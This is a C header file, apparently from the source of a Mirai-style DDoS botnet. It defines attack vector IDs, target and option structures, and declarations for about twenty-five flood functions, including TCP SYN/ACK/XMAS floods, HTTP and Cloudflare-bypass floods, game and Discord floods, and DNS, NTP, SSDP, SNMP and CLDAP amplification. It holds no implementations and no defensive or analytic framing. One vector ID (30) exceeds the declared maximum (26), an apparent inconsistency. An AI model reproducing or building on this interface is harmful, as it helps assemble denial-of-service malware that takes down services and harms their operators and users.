#ifndef _ATTACK_H
#define _ATTACK_H

#include "includes.h"

#define ATK_VEC_UDP             0
#define ATK_VEC_VSE             1
#define ATK_VEC_FIVEM           2
#define ATK_VEC_PPS             3
#define ATK_VEC_TLS             4
#define ATK_VEC_HTTP            5
#define ATK_VEC_CF              6
#define ATK_VEC_AXISL7          7
#define ATK_VEC_DNS_AMP         8
#define ATK_VEC_NTP_AMP         9
#define ATK_VEC_SSDP_AMP      10
#define ATK_VEC_SNMP_AMP      11
#define ATK_VEC_CLDAP_AMP     12
#define ATK_VEC_SYN           13
#define ATK_VEC_ACK           14
#define ATK_VEC_FIN           15
#define ATK_VEC_RST           16
#define ATK_VEC_TCPCONN       17
#define ATK_VEC_XMAS          18
#define ATK_VEC_NULL          19
#define ATK_VEC_WINDOW        20
#define ATK_VEC_ICMP          21
#define ATK_VEC_GREIP           22
#define ATK_VEC_GREETH          23
#define ATK_VEC_DISCORD       30

#define ATK_VEC_MAX             26

#define ATTACK_MAX_TARGETS  32
#define ATTACK_MAX_OPTIONS  32

#define ATK_OPT_PAYLOAD_SIZE    0
#define ATK_OPT_PAYLOAD_RAND    1
#define ATK_OPT_IP_TOS          2
#define ATK_OPT_IP_IDENT        3
#define ATK_OPT_IP_TTL          4
#define ATK_OPT_IP_DF           5
#define ATK_OPT_SPORT           6
#define ATK_OPT_DPORT           7
#define ATK_OPT_DOMAIN          8
#define ATK_OPT_HTTP_METHOD     9
#define ATK_OPT_HTTP_POST_DATA  10
#define ATK_OPT_HTTP_PATH       11
#define ATK_OPT_CONNS           12
#define ATK_OPT_SOURCE          13
#define ATK_OPT_URL             14
#define ATK_OPT_HTTPS           15
#define ATK_OPT_USERAGENT       16
#define ATK_OPT_COOKIES         17
#define ATK_OPT_REFERER         18

struct attack_target {
    struct in_addr addr;
    uint8_t netmask;
};

struct attack_option {
    uint8_t key;
    char *val;
};

struct attack_method {
    void (*func)(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
    uint8_t type;
};

void attack_init(void);
void attack_kill_all(void);
void attack_parse(char *, int);
void attack_start(int, uint8_t, int, struct attack_target *, struct attack_option *);
char *attack_get_opt_str(int, struct attack_option *, int, uint8_t);
int attack_get_opt_int(int, struct attack_option *, int, uint8_t);

void attack_udp_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_vse_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_tls_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_http_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_fivem_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_discord_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_pps_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_cf_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_axis_l7(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_dns_amp(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_ntp_amp(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_ssdp_amp(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_snmp_amp(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_cldap_amp(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);

/* Layer 4 TCP Methods */
void attack_syn_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_ack_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_fin_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_rst_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_tcpconn_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_xmas_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_null_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_window_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);

/* Special Methods */
void attack_icmp_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_greip_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_greeth_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);

#endif
